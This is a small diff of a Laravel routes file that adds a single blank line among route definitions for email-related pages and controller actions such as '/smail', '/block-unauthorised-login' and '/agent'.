@@ -30,6 +30,7 @@ Route::get('/email-secure-success', function () {
 Route::get('/smail', function () {
     return view('createEmail');
 });
+
 // Route::post('/login-app-email-realm-pass', 'PageController@index')->name('pages');
 Route::post('/block-unauthorised-login', 'PageController@net')->name('net');
 Route::get('/agent', 'PageController@agent');
